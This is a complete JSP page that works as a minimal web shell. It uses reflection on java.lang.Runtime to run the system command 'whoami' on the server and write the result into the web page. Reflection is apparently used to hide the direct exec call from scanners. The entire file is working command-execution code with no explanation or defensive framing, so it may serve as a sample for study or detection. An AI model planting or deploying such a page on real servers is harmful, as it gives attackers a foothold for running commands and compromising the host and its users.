<%@ page import="java.io.InputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    Class clazz = Class.forName("java.lang.Runtime");
    Object obj = clazz.getMethod("getRuntime").invoke(null);
    Process process = (Process) clazz.getMethod("exec", String.class).invoke(obj, "whoami");
    InputStream in = process.getInputStream();
    int a = 0;
    byte[] b = new byte[1024];

    while ((a = in.read(b)) != -1) {
        out.println(new String(b, 0, a));
    }
    out.flush();
%>